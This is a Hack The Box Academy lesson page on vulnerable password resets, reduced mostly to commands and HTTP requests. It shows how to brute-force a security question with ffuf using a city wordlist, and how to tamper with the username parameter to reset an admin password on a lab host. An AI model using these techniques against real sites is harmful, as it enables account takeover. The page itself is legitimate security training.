<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/779
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 779
// Section Title: Vulnerable Password Reset
// Page Title: Hack The Box - Academy
// Page Number: 9
-->

# Vulnerable Password Reset

**Module Name:** Broken Authentication **Page Number:** 9

#### 

#### BROKEN AUTHENTICATION

# Vulnerable Password Reset

## Guessable Password Reset Questions

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_1.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_1.png)

``` shell-session
ndefstathiou@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

ndefstathiou@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_2.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_2.png)

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_3.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_3.png)

``` shell-session
ndefstathiou@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_4.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_4.png)

``` shell-session
ndefstathiou@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

ndefstathiou@htb[/htb]$ wc -l german_cities.txt 

1117 german_cities.txt
```

## Manipulating the Reset Request

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_5.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_5.png)

``` http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_6.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_6.png)

``` http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

![https://academy.hackthebox.com/storage/modules/269/pw/pwreset_7.png](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_7.png)

``` http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

``` http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

# 

# 

#### Questions

####